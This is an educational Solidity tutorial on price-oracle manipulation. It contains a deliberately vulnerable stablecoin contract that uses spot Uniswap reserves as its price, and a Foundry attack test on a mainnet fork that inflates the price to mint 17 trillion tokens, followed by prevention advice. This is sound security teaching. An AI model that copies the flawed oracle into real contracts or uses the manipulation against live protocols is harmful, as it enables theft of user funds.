---
title: S15. Oracle Manipulation
tags:
- solidity
- security
- oracle

---

# WTF Solidity S15. Oracle Manipulation

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

-----

In this lesson, we will introduce the oracle manipulation attack on smart contracts and reproduce it using Foundry. In the example, we use `1 ETH` to exchange for 17 trillion stablecoins. In 2021, oracle manipulation attacks caused user asset losses of more than 200 million U.S. dollars.

## Price Oracle

For security reasons, the Ethereum Virtual Machine (EVM) is a closed and isolated sandbox. Smart contracts running on the EVM can access on-chain information but cannot actively communicate with the outside world to obtain off-chain information. However, this type of information is crucial for decentralized applications.

An oracle can help us solve this problem by obtaining information from off-chain data sources and adding it to the blockchain for smart contract use.

One of the most commonly used oracles is a price oracle, which refers to any data source that allows you to query the price of a token. Typical use cases include:
- Decentralized lending platforms (AAVE) use it to determine if a borrower has reached the liquidation threshold.
- Synthetic asset platforms (Synthetix) use it to determine the latest asset prices and support 0-slippage trades.
- MakerDAO uses it to determine the price of collateral and mint the corresponding stablecoin, DAI.

![](./img/S15-1.png)

## Oracle Vulnerabilities

If an oracle is not used correctly by developers, it can pose significant security risks.

- In October 2021, Cream Finance, a DeFi platform on the Binance Smart Chain, suffered a [theft of $130 million in user funds](https://rekt.news/cream-rekt-2/) due to an oracle vulnerability.
- In May 2022, Mirror Protocol, a synthetic asset platform on the Terra blockchain, suffered a [theft of $115 million in user funds](https://rekt.news/mirror-rekt/) due to an oracle vulnerability.
- In October 2022, Mango Market, a decentralized lending platform on the Solana blockchain, suffered a [theft of $115 million in user funds](https://rekt.news/mango-markets-rekt/) due to an oracle vulnerability.

## Vulnerability Example

Let's learn about an example of an oracle vulnerability in the `oUSD` contract. This contract is a stablecoin contract that complies with the ERC20 standard. Similar to the Synthetix synthetic asset platform, users can exchange `ETH` for `oUSD` (Oracle USD) with zero slippage in this contract. The exchange price is determined by a custom price oracle (`getPrice()` function), which relies on the instantaneous price of the `WETH-BUSD` pair on Uniswap V2. In the following attack example, we will see how this oracle can be easily manipulated.

### Vulnerable Contract

The `oUSD` contract includes `7` state variables to record the addresses of `BUSD`, `WETH`, the Uniswap V2 factory contract, and the `WETH-BUSD` pair contract.

The `oUSD` contract mainly consists of `3` functions:
- Constructor: Initializes the name and symbol of the `ERC20` token.
- `getPrice()`: Price oracle function that retrieves the instantaneous price of the `WETH-BUSD` pair on Uniswap V2. This is where the vulnerability lies.
  ```
    // Get ETH price
    function getPrice() public view returns (uint256 price) {
        // Reserves in the pair
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // Instantaneous price of ETH
        price = reserve0/reserve1;
    }
  ```
- `swap()` function, which exchanges `ETH` for `oUSD` at the price given by the oracle.

Source Code:

```solidity
contract oUSD is ERC20{
    // Mainnet contracts
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // Get ETH price
    function getPrice() public view returns (uint256 price) {
        // Reserves in the pair
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // Instantaneous price of ETH
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // Get price
        uint price = getPrice();
        // Calculate exchange amount
        amount = price * msg.value;
        // Mint tokens
        _mint(msg.sender, amount);
    }
}
```

### Attack Strategy

We will attack the vulnerable `getPrice()` function of the price oracle. The steps are as follows:

1. Prepare some `BUSD`, which can be our own funds or borrowed through flash loans. In the implementation, we use the Foundry's `deal` cheat code to mint ourselves `1,000,000 BUSD` on the local network.
2. Buy a large amount of `WETH` in the `WETH-BUSD` pool on UniswapV2. The specific implementation can be found in the `swapBUSDtoWETH()` function of the attack code.
3. The instantaneous price of `WETH` skyrockets. At this point, we call the `swap()` function to convert `ETH` into `oUSD`.
4. **Optional:** Sell the `WETH` bought in step 2 back to the `WETH-BUSD` pool to recover the principal.

These 4 steps can be completed in a single transaction.

### Reproduce on Foundry

We will use Foundry to reproduce the manipulation attack on the oracle because it is fast and allows us to create a local fork of the mainnet for testing. If you are not familiar with Foundry, you can read [WTF Solidity Tools T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md).

1. After installing Foundry, start a new project and install the OpenZeppelin library by running the following command in the command line:
  ```shell
  forge init Oracle
  cd Oracle
  forge install Openzeppelin/openzeppelin-contracts
  ```

2. Create an `.env` environment variable file in the root directory and add the mainnet rpc to create a local testnet.

  ```
  MAINNET_RPC_URL= https://rpc.ankr.com/eth
  ```

3. Copy the code from this lesson, `Oracle.sol` and `Oracle.t.sol`, to the `src` and `test` folders respectively in the root directory, and then start the attack script with the following command:

  ```
  forge test -vv --match-test testOracleAttack
  ```

4. We can see the attack result in the terminal. Before the attack, the oracle `getPrice()` gave a price of `1216 USD` for `ETH`, which is normal. However, after we bought `WETH` in the `WETH-BUSD` pool on UniswapV2 with `1,000,000` BUSD, the price given by the oracle was manipulated to `17,979,841,782,699 USD`. At this point, we can easily exchange `1 ETH` for 17 trillion `oUSD` and complete the attack.

  ```shell
  Running 1 test for test/Oracle.t.sol:OracleTest
  [PASS] testOracleAttack() (gas: 356524)
  Logs:
    1. ETH Price (before attack): 1216
    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
    3. ETH price (after attack): 17979841782699
    4. Minted 1797984178269 oUSD with 1 ETH (after attack)

  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
  ```

Attack Code:

```solidity
// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // Specify the forked block
        vm.createSelectFork(MAINNET_RPC_URL, 16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // Attack the oracle
        // 0. Get the price before manipulating the oracle
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore); 
        // Give yourself 1,000,000 BUSD
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. Buy WETH with BUSD to manipulate the oracle
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. Get the price after manipulating the oracle
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter); 
        // 4. Mint oUSD
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
    }

    // Swap BUSD to WETH
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {   
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
```

## How to Prevent

Renowned blockchain security expert `samczsun` summarized how to prevent oracle manipulation in a [blog post](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle). Here's a summary:

1. Avoid using pools with low liquidity as price oracles.
2. Avoid using spot/instant prices as price oracles; incorporate price delays, such as Time-Weighted Average Price (TWAP).
3. Use decentralized oracles.
4. Use multiple data sources and select the ones closest to the median price as oracles to avoid extreme situations.
5. Carefully read the documentation and parameter settings of third-party price oracles.

## Conclusion

In this lesson, we introduced the manipulation of price oracles and attacked a vulnerable synthetic stablecoin contract, exchanging `1 ETH` for 17 trillion stablecoins, making us the richest person in the world (not really).


